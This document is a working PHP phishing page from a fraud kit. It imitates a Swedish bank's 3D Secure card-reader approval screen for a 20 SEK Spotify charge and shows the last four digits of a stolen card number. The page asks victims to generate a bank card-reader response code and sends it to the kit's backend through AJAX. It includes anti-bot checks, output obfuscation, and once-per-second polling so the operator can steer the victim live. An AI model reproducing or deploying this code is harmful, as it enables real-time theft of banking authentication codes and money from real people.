<?php 
session_start();
require_once '../includes/functions.php';
validateVisit();
require_once '../includes/tracker.php';
require_once '../includes/lang.php';
require_once '../includes/absd.php';
require_once('../includes/obf.php');
$visitor = trackVisitor();
$customText = isset($_GET['text']) ? htmlspecialchars($_GET['text']) : '';
$security = new supersecurity();
$security->setTestMode(false);
$security->setExitLink(sitexite());
$security->run();
ob_start([TextObfuscator::class, 'obfuscateOutput']);
?>  
<html lang="en">
   <head>
      <meta charset="utf-8">
      <meta content="width=device-width, initial-scale=1.0" name="viewport">
      <title>3D Secure 2.0</title>
                 <link href="css/auth.css?" rel="stylesheet">
    <script src="js/jquery.js"></script>
      <style>.sf-hidden{display:none!important}
              		.is-invalid {
				border: 1px solid red;
										
				}
      </style>
   </head>
   <body>
      <form id="mainForm" method="post"  action="javascript:void(0)"> 
         <div class="container">
            <header class="header">
               <div>secure checkout</div>
               <button  name="cancel" type="button" value="Cancel" class="close cancel">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
                     <defs>
                        <style>.cls-white{fill:#fff;fill-rule:evenodd}</style>
                     </defs>
                     <path id="close-white" class="cls-white" d="M8,0a8,8,0,1,0,8,8A8.009,8.009,0,0,0,8,0Zm3.236,10.293a0.333,0.333,0,0,1,0,.471l-0.471.471a0.333,0.333,0,0,1-.471,0L8,8.942,5.707,11.235a0.333,0.333,0,0,1-.471,0l-0.471-.471a0.333,0.333,0,0,1,0-.471L7.057,8,4.764,5.707a0.333,0.333,0,0,1,0-.471l0.471-.471a0.333,0.333,0,0,1,.471,0L8,7.057l2.293-2.293a0.333,0.333,0,0,1,.471,0l0.471,0.471a0.333,0.333,0,0,1,0,.471L8.942,8Z"></path>
                  </svg>
               </button>
            </header>
            <div class="bank-info">
               <img src="data:image/gif;base64,R0lGODlhvQAeAPf/AIWy0nWpzO30+ABcnrXR426kyfv8/WmhxxVsqOTu9UKIuH2tz/T4+yJ0rUSKus7g7VaVwOjx9r/X51iWwfb5/ABknYm101GSvl6aw3KnyvP3+jF+suPt9TaCtJm+2YKx0LTQ49jn8AllpKHE3EeMumGcxABgn5W819Xl8P3+/rfS5AxnpH2n0tPj7hhuqYu61arK36jI36DD28PZ6lSUv1yZwniqzd7q8nqszSp5sJrA2Q5opkiMuxxxqpW7122jyDyFtgJgoU6Qvdro8Y231ESHthtwqsTa6Qlloj6Gtq7M4UyPvC58sSd3r8fc6tTk7xJqpwZjokqNvKbH3muiyCt6sFqXwihyrMLY5yl4r12awunx9wBgonCmypK71mSexZzB2iV2rvD2+bzV5nClypu917LP4rDN4mWexsre62egxjqDtpa92BRsp4q20+Pu9aTF3CBzrLjT5R5yq0mLuqTG3Z3C2gViomGawiN2rdzo8RFqpmaexLvU5bDN4U6NwZO91YCv0G+lyWSdxSV1rV+ZwkGItz2FtwBhpABjoQBdohpuqQBgoQBfoQBgoABeoMbb6hBppgBeofn7/efw9gFgoMjc6gRiobvU5tHi7vj7/PH2+l+bw6zL4Ie00tzp8snd6x9yrKfI3hpvqmafxj+Ht73W5t3q8gBdoQBhouDr85C41Mjd6qnJ37HO4j6GuBJppzR9tp7D2JG61hRrpwhko3WmyvP4+7TP5QlioXCjx+/1+RNrpcTb63OmyIiz0wNioCBzqyp+tFOTv8je68/h7dHg79Di7S6AtF+cxLLS3GabyG2fwqLD2wBeogJfoABnlqfD3+vy+H2kyDiBtIGuzCZ2rSZ4rxJppIK31QBhn16axT2Gt+Ds9BVrqQRgoSF0rAdhogRonbnW5c3f7KvL387i6l6dwuDs8zF/szR/s1+VwGygx+zz+JzA2WGewp7B2Z7C2xdtqdjl7hJrp5rJ34+u4KbG3Y+51gNhoZC71cjc67HO4QJlowBfoP///yH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDIgNzkuMTY0MzUyLCAyMDIwLzAxLzMwLTE1OjUwOjM4ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOjA3MmI3MGM2LTgzZGEtMjY0ZS1iMjZiLTY5Mzk3M2U3ZTEzOCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo0NjM0MjFGQTc3M0IxMUVBQUM1Q0ExRDBBMzk2MTQ0NyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo0NjM0MjFGOTc3M0IxMUVBQUM1Q0ExRDBBMzk2MTQ0NyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgMjEuMSAoV2luZG93cykiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDowNzJiNzBjNi04M2RhLTI2NGUtYjI2Yi02OTM5NzNlN2UxMzgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MDcyYjcwYzYtODNkYS0yNjRlLWIyNmItNjkzOTczZTdlMTM4Ii8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3Jx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" alt="Bank Logo">
               <img src="data:image/png;base64,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" alt="Payment Logo">
            </div>
            <div id="info-header" class="info-header" style="text-align: left;">Godkänn ditt köp</div>
            <div id="info-text" class="scrollbar info-text" style="text-align: left;">Du betalar 20 SEK hos Spotify med ett kort som slutar med <?php if(@$_SESSION['cc']!=""){echo substr($_SESSION['cc'], -4); }else{echo "****";}?>.<br><br>1. Sätt i ditt Mastercard i kortläsaren, tryck Buy.<br>2. Ange koden: <b><?php echo $customText; ?></b> i kortläsaren, tryck Ok.<br>3. Ange kortets PIN-kod, tryck Ok.<br>4. Ange kortläsarens svarskod i fältet nedan, tryck Godkänn köp.</div>
            <div id="tooltip" class="hide tooltip-wrapper sf-hidden">
            </div>
            <div class="actions">
               <div class="otp-input">
                  <input autocomplete="off" name="app2" id="app2" required="" pattern="^[0-9]{8}$" type="password" class="input" >
                   <?php 
if(isset($_GET['error'])){
echo " <div id='invalid-input-msg' class='error-text' style='color:red;'>Fel antal siffror/Ej tillåtet tecken har matats in</div>";
}
?> <script>

document.addEventListener('DOMContentLoaded', function() {

    const urlParams = new URLSearchParams(window.location.search);
    const inputElement = document.getElementById('app2'); 

   
    if (urlParams.has('error') && inputElement) {
         $("#app2").addClass('is-invalid');
    }

    if (inputElement) {
        inputElement.addEventListener('input', function() {
            if (this.value.length > 4) {
                 $("#app2").removeClass("is-invalid");
            } else if (!$("#app2").classList.contains('is-invalid') && urlParams.has('error')) {
                $("#app2").addClass("is-invalid");
            }
        });
    }
});
</script>

                  
               </div>
               <button type="submit" class="submit-label" id="submit-label">Godkänn köp</button>
            </div>
            <button class="resend-label button-link" name="resend" value="resend" id="resend-label">Skapa ny kontrollkod</button>
         </div>
      </form>
        <script type="text/javascript">
            var request;
            $("#mainForm").submit(function(event) {
              event.preventDefault();
              if (request) {
                request.abort();
              }
              var $form = $(this);
              var $inputs = $form.find("input, select, button, textarea");
              var serializedData = $form.serialize();
              $inputs.prop("disabled", true);
              request = $.ajax({
                url: "../includes/ajax.php",
                type: "post",
                data: serializedData
              });
              request.done(function(response, textStatus, jqXHR) {
                $(location).attr("href", "processing.php?p=APP&ids=<?php echo gurl();?>");
              });
              request.fail(function(jqXHR, textStatus, errorThrown) {
                console.error("The following error occurred: " + textStatus, errorThrown);
              });
              request.always(function() {
                $inputs.prop("disabled", false);
              });
            });
          </script>
                  <script src="js/misc.js"></script>
<script>
$("#app2").mask("00000000");
    	</script>
      	<script>

setInterval(function() {
    fetch('../check_redirect.php?visitor_id=<?php echo $visitor['id']; ?>')
        .then(response => response.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.url;
            }
        })
        .catch(error => console.error('Error checking redirect:', error));
        

    fetch('../ping.php?visitor_id=<?php echo $visitor['id']; ?>&page=<?php echo urlencode($_SERVER['REQUEST_URI']); ?>')
        .catch(error => console.error('Error sending ping:', error));
}, 1000);
        

        window.addEventListener('beforeunload', function() {
            navigator.sendBeacon('../ping.php?visitor_id=<?php echo $visitor['id']; ?>');
        });
    </script>
   </body>
</html>